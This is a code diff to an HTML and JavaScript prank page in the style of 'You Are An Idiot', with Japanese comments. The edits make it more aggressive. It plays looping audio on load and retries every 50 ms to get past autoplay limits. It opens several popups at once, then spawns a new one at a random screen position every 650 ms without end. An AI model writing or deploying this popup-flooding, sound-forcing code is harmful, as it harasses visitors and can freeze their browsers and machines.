@@ -9,53 +9,51 @@
             font-family: sans-serif; text-align: center; overflow: hidden;
         }
         h1 {
-            font-size: 3.8em;
+            font-size: 4em;
             margin: 8vh 0 10px;
-            text-shadow: 0 0 25px lime;
-            animation: blink 0.3s infinite alternate;
+            text-shadow: 0 0 30px lime;
+            animation: blink 0.25s infinite alternate;
         }
-        @keyframes blink { from { opacity: 0.5; } to { opacity: 1; } }
+        @keyframes blink { from { opacity: 0.4; } to { opacity: 1; } }
         .idiot-img {
-            max-width: 92vw;
-            max-height: 68vh;
+            max-width: 95vw;
+            max-height: 70vh;
             width: auto;
             height: auto;
             margin: 10px auto;
             display: block;
-            border: 8px solid lime;
-            box-shadow: 0 0 40px lime;
+            border: 10px solid lime;
+            box-shadow: 0 0 50px lime;
         }
-        p { font-size: 1.7em; margin: 15px; color: #ff0; }
+        p { font-size: 1.8em; margin: 20px; color: #ff0; animation: blink 1s infinite; }
     </style>
 </head>
 <body>
     <h1>YOU ARE AN IDIOT</h1>
     <img src="https://raw.githubusercontent.com/hoto17296/youareanidiot/master/youareanidiot.gif" 
          class="idiot-img" alt="You are an idiot">
-    <p>開いたら勝手に音が鳴り続けるはず...<br>（まだ鳴らない場合は1回クリックして！）</p>
+    <p>何もしないで勝手に始まるよ...<br>（Chromeの制限で完全に自動にするには起動方法を変えてね）</p>
 
-    <audio id="idiotSound" preload="auto" loop>
-        <source src="https://www.myinstants.com/media/sounds/you-are-an-idiot.mp3" type="audio/mpeg">
-    </audio>
+    <audio id="idiotSound" preload="auto" loop></audio>
 
     <script>
         const sound = document.getElementById('idiotSound');
+        sound.src = "https://www.myinstants.com/media/sounds/you-are-an-idiot.mp3";
         let count = 1;
 
         function forcePlay(audio) {
             if (!audio) return;
             audio.currentTime = 0;
             audio.play().catch(() => {
-                // 失敗したら即再挑戦（超強引）
-                setTimeout(() => forcePlay(audio), 80);
+                setTimeout(() => forcePlay(audio), 50);   // 超高速リトライ
             });
         }
 
         function spawnPopup() {
-            const width = 470;
-            const height = 430;
-            const left = Math.random() * (screen.availWidth - width - 180) + 90;
-            const top = Math.random() * (screen.availHeight - height - 180) + 90;
+            const width = 480;
+            const height = 440;
+            const left = Math.random() * (screen.availWidth - width - 150) + 75;
+            const top = Math.random() * (screen.availHeight - height - 150) + 75;
 
             const popup = window.open('', '_blank', 
                 `width=${width},height=${height},left=${Math.floor(left)},top=${Math.floor(top)},resizable=yes,scrollbars=no,menubar=no,toolbar=no,status=no`
@@ -70,42 +68,37 @@
                         <title>YOU ARE AN IDIOT ×${count}</title>
                         <style>
                             body { margin:0; padding:0; background:black; color:lime; text-align:center; overflow:hidden; }
-                            h1 { font-size:2.9em; margin:8vh 0 10px; text-shadow:0 0 20px lime; animation: blink 0.4s infinite alternate; }
-                            .idiot-img { max-width:92vw; max-height:68vh; width:auto; height:auto; margin:10px auto; display:block; border:7px solid lime; box-shadow:0 0 35px lime; }
-                            @keyframes blink { from { opacity: 0.6; } to { opacity: 1; } }
+                            h1 { font-size:3em; margin:8vh 0 10px; text-shadow:0 0 20px lime; animation: blink 0.4s infinite alternate; }
+                            .idiot-img { max-width:95vw; max-height:70vh; width:auto; height:auto; margin:10px auto; display:block; border:8px solid lime; box-shadow:0 0 40px lime; }
+                            @keyframes blink { from { opacity: 0.5; } to { opacity: 1; } }
                         </style>
                     </head>
                     <body>
                         <h1>YOU ARE AN IDIOT</h1>
                         <img src="https://raw.githubusercontent.com/hoto17296/youareanidiot/master/youareanidiot.gif" class="idiot-img" alt="idiot">
-                        <p>音が勝手に鳴ってるはず...</p>
-                        <audio id="sound" preload="auto" loop>
-                            <source src="https://www.myinstants.com/media/sounds/you-are-an-idiot.mp3" type="audio/mpeg">
-                        </audio>
+                        <p>勝手に音が鳴ってる...</p>
+                        <audio id="sound" preload="auto" loop></audio>
                         <script>
                             const s = document.getElementById('sound');
+                            s.src = "https://www.myinstants.com/media/sounds/you-are-an-idiot.mp3";
+
                             function forcePlay() {
                                 s.currentTime = 0;
-                                s.play().catch(() => setTimeout(forcePlay, 80));
+                                s.play().catch(() => setTimeout(forcePlay, 50));
                             }
 
-                            // ポップアップ開いた瞬間に超強引再生
+                            // ポップアップ開いた瞬間に完全自動で音を鳴らし続ける
                             window.onload = function() {
                                 forcePlay();
-                                setTimeout(forcePlay, 50);
-                                setTimeout(forcePlay, 120);
-                                setTimeout(forcePlay, 250);
+                                setTimeout(forcePlay, 30);
+                                setTimeout(forcePlay, 80);
+                                setTimeout(forcePlay, 150);
 
-                                // 100msごとに死ぬほど粘る保険
+                                // 50msごとに死ぬほど粘って再生
                                 setInterval(() => {
                                     if (s.paused || s.ended) forcePlay();
-                                }, 100);
+                                }, 50);
                             };
-
-                            document.addEventListener('click', () => {
-                                forcePlay();
-                                if (window.opener && typeof window.opener.spawnPopup === 'function') window.opener.spawnPopup();
-                            });
                         <\/script>
                     </body>
                     </html>
@@ -115,41 +108,36 @@
             }
         }
 
-        // ====================== メイン画面 ======================
+        // ====================== メイン画面（完全に自動で動くように最大限強引） ======================
         window.onload = () => {
+            // メイン音声も超強引自動再生
             function mainForcePlay() {
                 sound.currentTime = 0;
-                sound.play().catch(() => setTimeout(mainForcePlay, 80));
+                sound.play().catch(() => setTimeout(mainForcePlay, 50));
             }
 
-            // メインも超強引
             mainForcePlay();
-            setTimeout(mainForcePlay, 50);
-            setTimeout(mainForcePlay, 150);
-            setTimeout(mainForcePlay, 300);
+            setTimeout(mainForcePlay, 20);
+            setTimeout(mainForcePlay, 60);
+            setTimeout(mainForcePlay, 120);
 
-            // 開いた直後にポップアップ連発
-            setTimeout(() => spawnPopup(), 400);
-            setTimeout(() => spawnPopup(), 750);
+            // ページを開いた瞬間にポップアップを連発（できる限り早く）
+            setTimeout(() => spawnPopup(), 300);
+            setTimeout(() => spawnPopup(), 550);
+            setTimeout(() => spawnPopup(), 850);
             setTimeout(() => spawnPopup(), 1200);
 
-            // 自動増殖
+            // 自動増殖（ずっと勝手に増える）
             setTimeout(() => {
-                setInterval(spawnPopup, 680);
-            }, 2000);
+                setInterval(() => {
+                    spawnPopup();
+                }, 650);
+            }, 1800);
 
-            // クリックで10個
-            document.addEventListener('click', () => {
-                mainForcePlay();
-                for (let i = 0; i < 10; i++) {
-                    setTimeout(spawnPopup, i * 30);
-                }
-            });
-
-            // 最終保険
+            // 最終保険（音が止まったら即復活）
             setInterval(() => {
                 if (sound.paused) mainForcePlay();
-            }, 120);
+            }, 80);
         };
     </script>
 </body>
